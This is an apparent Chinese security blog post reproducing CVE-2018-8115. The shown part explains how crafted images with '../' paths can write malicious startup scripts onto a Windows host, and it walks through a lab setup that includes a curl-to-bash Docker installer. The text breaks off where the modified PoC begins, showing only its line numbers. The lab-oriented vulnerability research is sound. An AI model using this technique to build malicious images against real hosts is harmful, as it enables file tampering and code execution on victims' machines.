<!doctype html><html lang=zh-cn><head><meta charset=utf-8><meta name=viewport content="width=device-width,initial-scale=1"><meta name=robots content="noodp"><meta http-equiv=x-ua-compatible content="IE=edge, chrome=1"><title>CVE-2018-8115 漏洞复现 - HStar's Blog</title><meta name=Description content="Docker for Windows"><meta property="og:title" content="CVE-2018-8115 漏洞复现"><meta property="og:description" content="Docker for Windows"><meta property="og:type" content="article"><meta property="og:url" content="https://hstar.me/2020/09/cve-2018-8115-analysis/"><meta property="article:published_time" content="2020-09-15T13:40:02+08:00"><meta property="article:modified_time" content="2020-09-23T02:00:00+08:00"><meta name=twitter:card content="summary"><meta name=twitter:title content="CVE-2018-8115 漏洞复现"><meta name=twitter:description content="Docker for Windows"><meta name=application-name content="HStar's Blog"><meta name=apple-mobile-web-app-title content="HStar's Blog"><meta name=theme-color content="#ffffff"><meta name=msapplication-TileColor content="#da532c"><link rel="shortcut icon" type=image/x-icon href=/favicon.ico><link rel=icon type=image/png sizes=32x32 href=/favicon-32x32.png><link rel=icon type=image/png sizes=16x16 href=/favicon-16x16.png><link rel=apple-touch-icon sizes=180x180 href=/apple-touch-icon.png><link rel=mask-icon href=/safari-pinned-tab.svg color=#5bbad5><link rel=manifest href=/site.webmanifest><link rel=canonical href=https://hstar.me/2020/09/cve-2018-8115-analysis/><link rel=prev href=https://hstar.me/2020/09/note-software-test/><link rel=stylesheet href=/lib/normalize/normalize.min.css><link rel=stylesheet href=/css/style.min.css><link rel=stylesheet href=/lib/fontawesome-free/all.min.css><link rel=stylesheet href=/lib/animate/animate.min.css><script type=application/ld+json>{"@context":"http://schema.org","@type":"BlogPosting","headline":"CVE-2018-8115 漏洞复现","inLanguage":"zh-CN","mainEntityOfPage":{"@type":"WebPage","@id":"https:\/\/hstar.me\/2020\/09\/cve-2018-8115-analysis\/"},"genre":"posts","keywords":"漏洞复现","wordcount":7055,"url":"https:\/\/hstar.me\/2020\/09\/cve-2018-8115-analysis\/","datePublished":"2020-09-15T13:40:02+08:00","dateModified":"2020-09-23T02:00:00+08:00","publisher":{"@type":"Organization","name":"HStar"},"author":{"@type":"Person","name":"HStar"},"description":"Docker for Windows"}</script></head><body header-desktop=fixed header-mobile=auto><script type=text/javascript>(window.localStorage&&localStorage.getItem('theme')?localStorage.getItem('theme')==='dark':('auto'==='auto'?window.matchMedia('(prefers-color-scheme: dark)').matches:'auto'==='dark'))&&document.body.setAttribute('theme','dark');</script><div id=mask></div><div class=wrapper><header class=desktop id=header-desktop><div class=header-wrapper><div class=header-title><a href=/ title="HStar's Blog">HStar's Blog</a></div><div class=menu><div class=menu-inner><a class=menu-item href=/posts/>文章 </a><a class=menu-item href=/tags/>标签 </a><a class=menu-item href=/categories/>分类 </a><a class=menu-item href=/about/>关于 </a><span class="menu-item delimiter"></span><span class="menu-item search" id=search-desktop><input type=text placeholder=搜索文章标题或内容... id=search-input-desktop>
<a href=javascript:void(0); class="search-button search-toggle" id=search-toggle-desktop title=搜索><i class="fas fa-search fa-fw"></i></a><a href=javascript:void(0); class="search-button search-clear" id=search-clear-desktop title=清空><i class="fas fa-times-circle fa-fw"></i></a><span class="search-button search-loading" id=search-loading-desktop><i class="fas fa-spinner fa-fw fa-spin"></i></span></span><a href=javascript:void(0); class="menu-item theme-switch" title=切换主题><i class="fas fa-adjust fa-fw"></i></a></div></div></div></header><header class=mobile id=header-mobile><div class=header-container><div class=header-wrapper><div class=header-title><a href=/ title="HStar's Blog">HStar's Blog</a></div><div class=menu-toggle id=menu-toggle-mobile><span></span><span></span><span></span></div></div><div class=menu id=menu-mobile><div class=search-wrapper><div class="search mobile" id=search-mobile><input type=text placeholder=搜索文章标题或内容... id=search-input-mobile>
<a href=javascript:void(0); class="search-button search-toggle" id=search-toggle-mobile title=搜索><i class="fas fa-search fa-fw"></i></a><a href=javascript:void(0); class="search-button search-clear" id=search-clear-mobile title=清空><i class="fas fa-times-circle fa-fw"></i></a><span class="search-button search-loading" id=search-loading-mobile><i class="fas fa-spinner fa-fw fa-spin"></i></span></div><a href=javascript:void(0); class=search-cancel id=search-cancel-mobile>取消</a></div><a class=menu-item href=/posts/>文章</a><a class=menu-item href=/tags/>标签</a><a class=menu-item href=/categories/>分类</a><a class=menu-item href=/about/>关于</a><a href=javascript:void(0); class="menu-item theme-switch" title=切换主题>
<i class="fas fa-adjust fa-fw"></i></a></div></div></header><div class="search-dropdown desktop"><div id=search-dropdown-desktop></div></div><div class="search-dropdown mobile"><div id=search-dropdown-mobile></div></div><main class=main><div class=container><div class=toc id=toc-auto><h2 class=toc-title>目录</h2><div class="toc-content always-active" id=toc-content-auto></div></div><article class="page single"><h1 class="single-title animated flipInX">CVE-2018-8115 漏洞复现</h1><div class=post-meta><div class=post-meta-line><span class=post-author><a href=/about/ title=Author rel=author class=author><i class="fas fa-user-circle fa-fw"></i>HStar</a></span>&nbsp;<span class=post-category>收录于 <a href=/categories/%E6%9C%89%E8%B6%A3%E7%9A%84%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/><i class="far fa-folder fa-fw"></i>有趣的渗透测试</a></span></div><div class=post-meta-line><i class="far fa-calendar-alt fa-fw"></i>&nbsp;<time datetime=2020-09-15>2020-09-15</time>&nbsp;<i class="fas fa-pencil-alt fa-fw"></i>&nbsp;约 7055 字&nbsp;
<i class="far fa-clock fa-fw"></i>&nbsp;预计阅读 15 分钟&nbsp;<span id=/2020/09/cve-2018-8115-analysis/ class=leancloud_visitors data-flag-title="CVE-2018-8115 漏洞复现">
<i class="far fa-eye fa-fw"></i>&nbsp;<span class=leancloud-visitors-count></span>&nbsp;次阅读
</span>&nbsp;</div></div><div class=featured-image><img class=lazyload src=/svg/loading.min.svg data-src=/images/CVE-2018-8115%e6%bc%8f%e6%b4%9e%e5%a4%8d%e7%8e%b0/docker-and-windows.jpg data-srcset="/images/CVE-2018-8115%e6%bc%8f%e6%b4%9e%e5%a4%8d%e7%8e%b0/docker-and-windows.jpg, /images/CVE-2018-8115%e6%bc%8f%e6%b4%9e%e5%a4%8d%e7%8e%b0/docker-and-windows.jpg 1.5x, /images/CVE-2018-8115%e6%bc%8f%e6%b4%9e%e5%a4%8d%e7%8e%b0/docker-and-windows.jpg 2x" data-sizes=auto alt=/images/CVE-2018-8115漏洞复现/docker-and-windows.jpg title="Docker for Windows"></div><div class="details toc" id=toc-static kept><div class="details-summary toc-title"><span>目录</span>
<span><i class="details-icon fas fa-angle-right"></i></span></div><div class="details-content toc-content" id=toc-content-static><nav id=TableOfContents><ul><li><a href=#前言>前言</a></li><li><a href=#环境搭建>环境搭建</a><ul><li><a href=#docker-for-windows-安装>Docker for Windows 安装</a></li><li><a href=#registry-搭建>Registry 搭建</a></li></ul></li><li><a href=#复现漏洞>复现漏洞</a></li><li><a href=#踩坑日记>踩坑日记</a><ul><li><a href=#docker学习>Docker学习</a></li><li><a href=#问题分析>问题分析</a></li><li><a href=#最终解决>最终解决</a></li></ul></li><li><a href=#end>END</a></li><li><a href=#参考链接>参考链接</a></li></ul></nav></div></div><div class=content id=content><hr><h2 id=前言>前言</h2><p>微软与 <a href=https://www.docker.com/ target=_blank rel="noopener noreffer">Docker</a> 合作，让 Docker 能够跑在 Windows 上以及支持 <a href=https://docs.microsoft.com/en-us/virtualization/windowscontainers/about/ target=_blank rel="noopener noreffer">Windows 容器</a>，做了很多工作，其中一个是开发了 <a href=https://github.com/microsoft/hcsshim target=_blank rel="noopener noreffer">hcsshim</a> 套件，该套件可使用Windows <a href=https://techcommunity.microsoft.com/t5/containers/introducing-the-host-compute-service-hcs/ba-p/382332 target=_blank rel="noopener noreffer">Host Compute Service</a>（HCS）启动和管理 Windows 容器。它还包含用于管理 Windows 容器的其他帮助程序和功能，例如用于主机网络服务（HNS）的 Golang 界面。</p><p>在 hcsshim v0.6.10 之前的版本中，该套件由于将未经处理的输入与将 <a href=https://golang.org/ target=_blank rel="noopener noreffer">Golang</a> 的 <a href=https://golang.org/pkg/path/filepath/#Join target=_blank rel="noopener noreffer"><code>filepath.Join</code></a> 结合使用，导致攻击者可利用 <code>../</code> 这样的控制序列字符串来达到控制目录的效果，从而实现在宿主机系统中创建、删除和替换文件，甚至可以写入恶意脚本到自启项目录，来达到命令执行的效果。而使用了此套件的 <a href=https://www.docker.com/docker-windows target=_blank rel="noopener noreffer">Docker for Windows</a> 受到此漏洞影响，如果攻击者恶意构造了镜像，受害者 pull 镜像即可造成攻击。</p><hr><h2 id=环境搭建>环境搭建</h2><p>由于该漏洞出现在 <a href=https://www.docker.com/docker-windows target=_blank rel="noopener noreffer">Docker for Windows</a> 上，并且需要自己构建镜像，所以需要使用到以下环境：</p><ul><li>Windows 10 2004：版本无强制要求，Win10 就行，文章中使用的系统内部版本号为 19041.450</li><li>Ubuntu 20.04 LTS：版本无强制要求，用来搭建私有仓库 Registry</li><li>Docker for Windows 17.12.0-ce-win47：<a href=https://docs.docker.com/docker-for-windows/release-notes/#docker-community-edition-17120-ce-win47-2018-01-12>https://docs.docker.com/docker-for-windows/release-notes/#docker-community-edition-17120-ce-win47-2018-01-12</a></li><li>VMware® Workstation 15 Pro</li></ul><hr><h3 id=docker-for-windows-安装>Docker for Windows 安装</h3><p>首先，在虚拟机上装好 Windows 10 2004，开机前调整如下配置：</p><ul><li><p>内存设置 4G 以上</p></li><li><p>开启虚拟化引擎</p></li></ul><p><figure><a class=lightgallery href=/images/CVE-2018-8115%e6%bc%8f%e6%b4%9e%e5%a4%8d%e7%8e%b0/04b12c00-fcfd-11ea-b5b0-80fa5b238e56.png data-thumbnail=/images/CVE-2018-8115漏洞复现/04b12c00-fcfd-11ea-b5b0-80fa5b238e56.png data-sub-html="<h2> </h2><p> </p>"><img class=lazyload src=/svg/loading.min.svg data-src=/images/CVE-2018-8115%e6%bc%8f%e6%b4%9e%e5%a4%8d%e7%8e%b0/04b12c00-fcfd-11ea-b5b0-80fa5b238e56.png data-srcset="/images/CVE-2018-8115%e6%bc%8f%e6%b4%9e%e5%a4%8d%e7%8e%b0/04b12c00-fcfd-11ea-b5b0-80fa5b238e56.png, /images/CVE-2018-8115%e6%bc%8f%e6%b4%9e%e5%a4%8d%e7%8e%b0/04b12c00-fcfd-11ea-b5b0-80fa5b238e56.png 1.5x, /images/CVE-2018-8115%e6%bc%8f%e6%b4%9e%e5%a4%8d%e7%8e%b0/04b12c00-fcfd-11ea-b5b0-80fa5b238e56.png 2x" data-sizes=auto alt=/images/CVE-2018-8115漏洞复现/04b12c00-fcfd-11ea-b5b0-80fa5b238e56.png></a><figcaption class=image-caption></figcaption></figure></p><p>设置好之后，即可开机，并安装 <code>Docker for Windows Installer.exe</code>，安装比较简单，按照如下步骤即可：</p><p><figure><a class=lightgallery href=/images/CVE-2018-8115%e6%bc%8f%e6%b4%9e%e5%a4%8d%e7%8e%b0/04b263b0-fcfd-11ea-99cc-80fa5b238e56.png data-thumbnail=/images/CVE-2018-8115漏洞复现/04b263b0-fcfd-11ea-99cc-80fa5b238e56.png data-sub-html="<h2> </h2><p> </p>"><img class=lazyload src=/svg/loading.min.svg data-src=/images/CVE-2018-8115%e6%bc%8f%e6%b4%9e%e5%a4%8d%e7%8e%b0/04b263b0-fcfd-11ea-99cc-80fa5b238e56.png data-srcset="/images/CVE-2018-8115%e6%bc%8f%e6%b4%9e%e5%a4%8d%e7%8e%b0/04b263b0-fcfd-11ea-99cc-80fa5b238e56.png, /images/CVE-2018-8115%e6%bc%8f%e6%b4%9e%e5%a4%8d%e7%8e%b0/04b263b0-fcfd-11ea-99cc-80fa5b238e56.png 1.5x, /images/CVE-2018-8115%e6%bc%8f%e6%b4%9e%e5%a4%8d%e7%8e%b0/04b263b0-fcfd-11ea-99cc-80fa5b238e56.png 2x" data-sizes=auto alt=/images/CVE-2018-8115漏洞复现/04b263b0-fcfd-11ea-99cc-80fa5b238e56.png></a><figcaption class=image-caption></figcaption></figure></p><p>安装完毕之后会注销一次，再次登录之后，Docker 会自动启动，并且会要求开启 Hyper-V：</p><p><figure><a class=lightgallery href=/images/CVE-2018-8115%e6%bc%8f%e6%b4%9e%e5%a4%8d%e7%8e%b0/04b29252-fcfd-11ea-9457-80fa5b238e56.png data-thumbnail=/images/CVE-2018-8115漏洞复现/04b29252-fcfd-11ea-9457-80fa5b238e56.png data-sub-html="<h2> </h2><p> </p>"><img class=lazyload src=/svg/loading.min.svg data-src=/images/CVE-2018-8115%e6%bc%8f%e6%b4%9e%e5%a4%8d%e7%8e%b0/04b29252-fcfd-11ea-9457-80fa5b238e56.png data-srcset="/images/CVE-2018-8115%e6%bc%8f%e6%b4%9e%e5%a4%8d%e7%8e%b0/04b29252-fcfd-11ea-9457-80fa5b238e56.png, /images/CVE-2018-8115%e6%bc%8f%e6%b4%9e%e5%a4%8d%e7%8e%b0/04b29252-fcfd-11ea-9457-80fa5b238e56.png 1.5x, /images/CVE-2018-8115%e6%bc%8f%e6%b4%9e%e5%a4%8d%e7%8e%b0/04b29252-fcfd-11ea-9457-80fa5b238e56.png 2x" data-sizes=auto alt=/images/CVE-2018-8115漏洞复现/04b29252-fcfd-11ea-9457-80fa5b238e56.png></a><figcaption class=image-caption></figcaption></figure></p><p>单击 <code>OK</code> 之后，会自动重启，并安装 Hyper-V，重启之后，会看下如下提示：</p><p><figure><a class=lightgallery href=/images/CVE-2018-8115%e6%bc%8f%e6%b4%9e%e5%a4%8d%e7%8e%b0/04b2c05a-fcfd-11ea-a05b-80fa5b238e56.png data-thumbnail=/images/CVE-2018-8115漏洞复现/04b2c05a-fcfd-11ea-a05b-80fa5b238e56.png data-sub-html="<h2> </h2><p> </p>"><img class=lazyload src=/svg/loading.min.svg data-src=/images/CVE-2018-8115%e6%bc%8f%e6%b4%9e%e5%a4%8d%e7%8e%b0/04b2c05a-fcfd-11ea-a05b-80fa5b238e56.png data-srcset="/images/CVE-2018-8115%e6%bc%8f%e6%b4%9e%e5%a4%8d%e7%8e%b0/04b2c05a-fcfd-11ea-a05b-80fa5b238e56.png, /images/CVE-2018-8115%e6%bc%8f%e6%b4%9e%e5%a4%8d%e7%8e%b0/04b2c05a-fcfd-11ea-a05b-80fa5b238e56.png 1.5x, /images/CVE-2018-8115%e6%bc%8f%e6%b4%9e%e5%a4%8d%e7%8e%b0/04b2c05a-fcfd-11ea-a05b-80fa5b238e56.png 2x" data-sizes=auto alt=/images/CVE-2018-8115漏洞复现/04b2c05a-fcfd-11ea-a05b-80fa5b238e56.png></a><figcaption class=image-caption></figcaption></figure></p><p>单击 <code>Start</code>，随后等待 Docker 启动，等待良久之后会出现下面这个错误提示：</p><p><figure><a class=lightgallery href=/images/CVE-2018-8115%e6%bc%8f%e6%b4%9e%e5%a4%8d%e7%8e%b0/04b2e76c-fcfd-11ea-b739-80fa5b238e56.png data-thumbnail=/images/CVE-2018-8115漏洞复现/04b2e76c-fcfd-11ea-b739-80fa5b238e56.png data-sub-html="<h2> </h2><p> </p>"><img class=lazyload src=/svg/loading.min.svg data-src=/images/CVE-2018-8115%e6%bc%8f%e6%b4%9e%e5%a4%8d%e7%8e%b0/04b2e76c-fcfd-11ea-b739-80fa5b238e56.png data-srcset="/images/CVE-2018-8115%e6%bc%8f%e6%b4%9e%e5%a4%8d%e7%8e%b0/04b2e76c-fcfd-11ea-b739-80fa5b238e56.png, /images/CVE-2018-8115%e6%bc%8f%e6%b4%9e%e5%a4%8d%e7%8e%b0/04b2e76c-fcfd-11ea-b739-80fa5b238e56.png 1.5x, /images/CVE-2018-8115%e6%bc%8f%e6%b4%9e%e5%a4%8d%e7%8e%b0/04b2e76c-fcfd-11ea-b739-80fa5b238e56.png 2x" data-sizes=auto alt=/images/CVE-2018-8115漏洞复现/04b2e76c-fcfd-11ea-b739-80fa5b238e56.png></a><figcaption class=image-caption></figcaption></figure></p><p>出现这个提示是因为是在虚拟机上安装的 Docker for Windows，如果是真实机器就不会出现这个情况。解决方法是右键右下角的 Docker 图标，单击 <code>Switch to Windows containers</code>，如下：</p><p><figure><a class=lightgallery href=/images/CVE-2018-8115%e6%bc%8f%e6%b4%9e%e5%a4%8d%e7%8e%b0/04b33590-fcfd-11ea-af58-80fa5b238e56.png data-thumbnail=/images/CVE-2018-8115漏洞复现/04b33590-fcfd-11ea-af58-80fa5b238e56.png data-sub-html="<h2> </h2><p> </p>"><img class=lazyload src=/svg/loading.min.svg data-src=/images/CVE-2018-8115%e6%bc%8f%e6%b4%9e%e5%a4%8d%e7%8e%b0/04b33590-fcfd-11ea-af58-80fa5b238e56.png data-srcset="/images/CVE-2018-8115%e6%bc%8f%e6%b4%9e%e5%a4%8d%e7%8e%b0/04b33590-fcfd-11ea-af58-80fa5b238e56.png, /images/CVE-2018-8115%e6%bc%8f%e6%b4%9e%e5%a4%8d%e7%8e%b0/04b33590-fcfd-11ea-af58-80fa5b238e56.png 1.5x, /images/CVE-2018-8115%e6%bc%8f%e6%b4%9e%e5%a4%8d%e7%8e%b0/04b33590-fcfd-11ea-af58-80fa5b238e56.png 2x" data-sizes=auto alt=/images/CVE-2018-8115漏洞复现/04b33590-fcfd-11ea-af58-80fa5b238e56.png></a><figcaption class=image-caption></figcaption></figure></p><p>切换了之后 Docker 会正常启动成功，在命令行输入 <code>docker info</code> 可看到 Docker 相关信息：</p><p><figure><a class=lightgallery href=/images/CVE-2018-8115%e6%bc%8f%e6%b4%9e%e5%a4%8d%e7%8e%b0/04b363b4-fcfd-11ea-b45a-80fa5b238e56.png data-thumbnail=/images/CVE-2018-8115漏洞复现/04b363b4-fcfd-11ea-b45a-80fa5b238e56.png data-sub-html="<h2> </h2><p> </p>"><img class=lazyload src=/svg/loading.min.svg data-src=/images/CVE-2018-8115%e6%bc%8f%e6%b4%9e%e5%a4%8d%e7%8e%b0/04b363b4-fcfd-11ea-b45a-80fa5b238e56.png data-srcset="/images/CVE-2018-8115%e6%bc%8f%e6%b4%9e%e5%a4%8d%e7%8e%b0/04b363b4-fcfd-11ea-b45a-80fa5b238e56.png, /images/CVE-2018-8115%e6%bc%8f%e6%b4%9e%e5%a4%8d%e7%8e%b0/04b363b4-fcfd-11ea-b45a-80fa5b238e56.png 1.5x, /images/CVE-2018-8115%e6%bc%8f%e6%b4%9e%e5%a4%8d%e7%8e%b0/04b363b4-fcfd-11ea-b45a-80fa5b238e56.png 2x" data-sizes=auto alt=/images/CVE-2018-8115漏洞复现/04b363b4-fcfd-11ea-b45a-80fa5b238e56.png></a><figcaption class=image-caption></figcaption></figure></p><h3 id=registry-搭建>Registry 搭建</h3><p>首先需将 Ubuntu 20.04 系统安装好，装好之后在命令行输入 <code>curl -fsSL https://get.docker.com | bash -s docker --mirror Aliyun</code> 安装 Docker，注意需要 root 权限：</p><p><figure><a class=lightgallery href=/images/CVE-2018-8115%e6%bc%8f%e6%b4%9e%e5%a4%8d%e7%8e%b0/04b38bec-fcfd-11ea-bf66-80fa5b238e56.png data-thumbnail=/images/CVE-2018-8115漏洞复现/04b38bec-fcfd-11ea-bf66-80fa5b238e56.png data-sub-html="<h2> </h2><p> </p>"><img class=lazyload src=/svg/loading.min.svg data-src=/images/CVE-2018-8115%e6%bc%8f%e6%b4%9e%e5%a4%8d%e7%8e%b0/04b38bec-fcfd-11ea-bf66-80fa5b238e56.png data-srcset="/images/CVE-2018-8115%e6%bc%8f%e6%b4%9e%e5%a4%8d%e7%8e%b0/04b38bec-fcfd-11ea-bf66-80fa5b238e56.png, /images/CVE-2018-8115%e6%bc%8f%e6%b4%9e%e5%a4%8d%e7%8e%b0/04b38bec-fcfd-11ea-bf66-80fa5b238e56.png 1.5x, /images/CVE-2018-8115%e6%bc%8f%e6%b4%9e%e5%a4%8d%e7%8e%b0/04b38bec-fcfd-11ea-bf66-80fa5b238e56.png 2x" data-sizes=auto alt=/images/CVE-2018-8115漏洞复现/04b38bec-fcfd-11ea-bf66-80fa5b238e56.png></a><figcaption class=image-caption></figcaption></figure></p><p>设置 Docker 镜像加速，这样下载镜像时快一点，输入命令 <code>echo '{"registry-mirrors":["https://hub-mirror.c.163.com/"]}' > /etc/docker/daemon.json</code> (如文件已存在请根据实际情况添加)：</p><p><figure><a class=lightgallery href=/images/CVE-2018-8115%e6%bc%8f%e6%b4%9e%e5%a4%8d%e7%8e%b0/04b3ad90-fcfd-11ea-b021-80fa5b238e56.png data-thumbnail=/images/CVE-2018-8115漏洞复现/04b3ad90-fcfd-11ea-b021-80fa5b238e56.png data-sub-html="<h2> </h2><p> </p>"><img class=lazyload src=/svg/loading.min.svg data-src=/images/CVE-2018-8115%e6%bc%8f%e6%b4%9e%e5%a4%8d%e7%8e%b0/04b3ad90-fcfd-11ea-b021-80fa5b238e56.png data-srcset="/images/CVE-2018-8115%e6%bc%8f%e6%b4%9e%e5%a4%8d%e7%8e%b0/04b3ad90-fcfd-11ea-b021-80fa5b238e56.png, /images/CVE-2018-8115%e6%bc%8f%e6%b4%9e%e5%a4%8d%e7%8e%b0/04b3ad90-fcfd-11ea-b021-80fa5b238e56.png 1.5x, /images/CVE-2018-8115%e6%bc%8f%e6%b4%9e%e5%a4%8d%e7%8e%b0/04b3ad90-fcfd-11ea-b021-80fa5b238e56.png 2x" data-sizes=auto alt=/images/CVE-2018-8115漏洞复现/04b3ad90-fcfd-11ea-b021-80fa5b238e56.png></a><figcaption class=image-caption></figcaption></figure></p><p>输入以下语句重启 Docker：</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span></code></pre></td><td class=lntd><pre class=chroma><code class=language-bash data-lang=bash>systemctl daemon-reload
systemctl restart docker
</code></pre></td></tr></table></div></div><p>使用 <code>docker info</code> 可查看是否设置成功：</p><p><figure><a class=lightgallery href=/images/CVE-2018-8115%e6%bc%8f%e6%b4%9e%e5%a4%8d%e7%8e%b0/04b3d49a-fcfd-11ea-92e9-80fa5b238e56.png data-thumbnail=/images/CVE-2018-8115漏洞复现/04b3d49a-fcfd-11ea-92e9-80fa5b238e56.png data-sub-html="<h2> </h2><p> </p>"><img class=lazyload src=/svg/loading.min.svg data-src=/images/CVE-2018-8115%e6%bc%8f%e6%b4%9e%e5%a4%8d%e7%8e%b0/04b3d49a-fcfd-11ea-92e9-80fa5b238e56.png data-srcset="/images/CVE-2018-8115%e6%bc%8f%e6%b4%9e%e5%a4%8d%e7%8e%b0/04b3d49a-fcfd-11ea-92e9-80fa5b238e56.png, /images/CVE-2018-8115%e6%bc%8f%e6%b4%9e%e5%a4%8d%e7%8e%b0/04b3d49a-fcfd-11ea-92e9-80fa5b238e56.png 1.5x, /images/CVE-2018-8115%e6%bc%8f%e6%b4%9e%e5%a4%8d%e7%8e%b0/04b3d49a-fcfd-11ea-92e9-80fa5b238e56.png 2x" data-sizes=auto alt=/images/CVE-2018-8115漏洞复现/04b3d49a-fcfd-11ea-92e9-80fa5b238e56.png></a><figcaption class=image-caption></figcaption></figure></p><p>Docker 安装好之后，接下来搭建 Registry，输入如下命令：</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre class=chroma><code><span class=lnt>1
</span></code></pre></td><td class=lntd><pre class=chroma><code class=language-bash data-lang=bash>docker run -d -p 5000:5000 --name registry docker.io/library/registry:2
</code></pre></td></tr></table></div></div><p><figure><a class=lightgallery href=/images/CVE-2018-8115%e6%bc%8f%e6%b4%9e%e5%a4%8d%e7%8e%b0/04b3d49b-fcfd-11ea-ad1f-80fa5b238e56.png data-thumbnail=/images/CVE-2018-8115漏洞复现/04b3d49b-fcfd-11ea-ad1f-80fa5b238e56.png data-sub-html="<h2> </h2><p> </p>"><img class=lazyload src=/svg/loading.min.svg data-src=/images/CVE-2018-8115%e6%bc%8f%e6%b4%9e%e5%a4%8d%e7%8e%b0/04b3d49b-fcfd-11ea-ad1f-80fa5b238e56.png data-srcset="/images/CVE-2018-8115%e6%bc%8f%e6%b4%9e%e5%a4%8d%e7%8e%b0/04b3d49b-fcfd-11ea-ad1f-80fa5b238e56.png, /images/CVE-2018-8115%e6%bc%8f%e6%b4%9e%e5%a4%8d%e7%8e%b0/04b3d49b-fcfd-11ea-ad1f-80fa5b238e56.png 1.5x, /images/CVE-2018-8115%e6%bc%8f%e6%b4%9e%e5%a4%8d%e7%8e%b0/04b3d49b-fcfd-11ea-ad1f-80fa5b238e56.png 2x" data-sizes=auto alt=/images/CVE-2018-8115漏洞复现/04b3d49b-fcfd-11ea-ad1f-80fa5b238e56.png></a><figcaption class=image-caption></figcaption></figure></p><p>容器运行起来之后使用 <code>curl http://127.0.0.1:5000/v2/_catalog</code> 可测试是否搭建成功：</p><p><figure><a class=lightgallery href=/images/CVE-2018-8115%e6%bc%8f%e6%b4%9e%e5%a4%8d%e7%8e%b0/04b4229e-fcfd-11ea-9658-80fa5b238e56.png data-thumbnail=/images/CVE-2018-8115漏洞复现/04b4229e-fcfd-11ea-9658-80fa5b238e56.png data-sub-html="<h2> </h2><p> </p>"><img class=lazyload src=/svg/loading.min.svg data-src=/images/CVE-2018-8115%e6%bc%8f%e6%b4%9e%e5%a4%8d%e7%8e%b0/04b4229e-fcfd-11ea-9658-80fa5b238e56.png data-srcset="/images/CVE-2018-8115%e6%bc%8f%e6%b4%9e%e5%a4%8d%e7%8e%b0/04b4229e-fcfd-11ea-9658-80fa5b238e56.png, /images/CVE-2018-8115%e6%bc%8f%e6%b4%9e%e5%a4%8d%e7%8e%b0/04b4229e-fcfd-11ea-9658-80fa5b238e56.png 1.5x, /images/CVE-2018-8115%e6%bc%8f%e6%b4%9e%e5%a4%8d%e7%8e%b0/04b4229e-fcfd-11ea-9658-80fa5b238e56.png 2x" data-sizes=auto alt=/images/CVE-2018-8115漏洞复现/04b4229e-fcfd-11ea-9658-80fa5b238e56.png></a><figcaption class=image-caption></figcaption></figure></p><hr><h2 id=复现漏洞>复现漏洞</h2><p>该漏洞主要针对 Docker 在 pull 镜像时，未处理好镜像中的文件拷贝，导致可以穿越路径来写入恶意文件到指定路径。所以第一件事是先构建恶意镜像，需在刚才搭建的 Registry 上构建。</p><p>由于作者提供的 <code>PoC</code> 存在一定的问题，直接使用会失败，这里将其进行了修改：</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre class=chroma><code><span class=lnt>  1
</span><span class=lnt>  2
</span><span class=lnt>  3
</span><span class=lnt>  4
</span><span class=lnt>  5
</span><span class=lnt>  6
</span><span class=lnt>  7
</span><span class=lnt>  8
</span><span class=lnt>  9
</span><span class=lnt> 10
</span><span class=lnt> 11
</span><span class=lnt> 12
</span><span class=lnt> 13
</span><span class=lnt> 14
</span><span class=lnt> 15
</span><span class=lnt> 16
</span><span class=lnt> 17
</span><span class=lnt> 18
</span><span class=lnt> 19
</span><span class=lnt> 20
</span><span class=lnt> 21
</span><span class=lnt> 22
</span><span class=lnt> 23
</span><span class=lnt> 24
</span><span class=lnt> 25
</span><span class=lnt> 26
</span><span class=lnt> 27
</span><span class=lnt> 28
</span><span class=lnt> 29
</span><span class=lnt> 30
</span><span class=lnt> 31
</span><span class=lnt> 32
</span><span class=lnt> 33
</span><span class=lnt> 34
</span><span class=lnt> 35
</span><span class=lnt> 36
</span><span class=lnt> 37
</span><span class=lnt> 38
</span><span class=lnt> 39
</span><span class=lnt> 40
</span><span class=lnt> 41
</span><span class=lnt> 42
</span><span class=lnt> 43
</span><span class=lnt> 44
</span><span class=lnt> 45
</span><span class=lnt> 46
</span><span class=lnt> 47
</span><span class=lnt> 48
</span><span class=lnt> 49
</span><span class=lnt> 50
</span><span class=lnt> 51
</span><span class=lnt> 52
</span><span class=lnt> 53
</span><span class=lnt> 54
</span><span class=lnt> 55
</span><span class=lnt> 56
</span><span class=lnt> 57
</span><span class=lnt> 58
</span><span class=lnt> 59
</span><span class=lnt> 60
</span><span class=lnt> 61
</span><span class=lnt> 62
</span><span class=lnt> 63
</span><span class=lnt> 64
</span><span class=lnt> 65
</span><span class=lnt> 66
</span><span class=lnt> 67
</span><span class=lnt> 68
</span><span class=lnt> 69
</span><span class=lnt> 70
</span><span class=lnt> 71
</span><span class=lnt> 72
</span><span class=lnt> 73
</span><span class=lnt> 74
</span><span class=lnt> 75
</span><span class=lnt> 76
</span><span class=lnt> 77
</span><span class=lnt> 78
</span><span class=lnt> 79
</span><span class=lnt> 80
</span><span class=lnt> 81
</span><span class=lnt> 82
</span><span class=lnt> 83
</span><span class=lnt> 84
</span><span class=lnt> 85
</span><span class=lnt> 86
</span><span class=lnt> 87
</span><span class=lnt> 88
</span><span class=lnt> 89
</span><span class=lnt> 90
</span><span class=lnt> 91
</span><span class=lnt> 92
</span><span class=lnt> 93
</span><span class=lnt> 94
</span><span class=lnt> 95
</span><span class=lnt> 96
</span><span class=lnt> 97
</span><span class=lnt> 98
</span><span class=lnt> 99
</span><span class=lnt>100
</span><span class=lnt>101
</span><span class=lnt>102
</span><span class=lnt>103
</span><span class=lnt>104
</span><span class=lnt>105
</span><span class=lnt>106
</span><span class=lnt>107
</span><span class=lnt>108
</span><span class=lnt>109
</span><span class=lnt>110
</span><span class=lnt>111
</span><span class=lnt>112
</span><span class=lnt>113
</span><span class=lnt>114
</span><span class=lnt>115
</span><span class=lnt>116
</span><span class=lnt>117
</span><span class=lnt>118
</span><span class=lnt>119
</span><span class=lnt>120
</span><span class=lnt>121
</span><span class=lnt>122
</span><span class=lnt>123
</span><span class=lnt>124
</span><span class=lnt>125
</span><span class=lnt>126
</span><span class=lnt>127
</span><span class=lnt>128
</span><span class=lnt>129
</span><span class=lnt>130
</span><span class=lnt>131
</span><span class=lnt>132
</span><span class=lnt>133
</span><span class=lnt>134
</span><span class=lnt>135
</span><span class=lnt>136
</span><span class=lnt>137
</span><span class=lnt>138
</span><span class=lnt>139
</span><span class=lnt>140
</span><span class=lnt>141
</span><span class=lnt>142
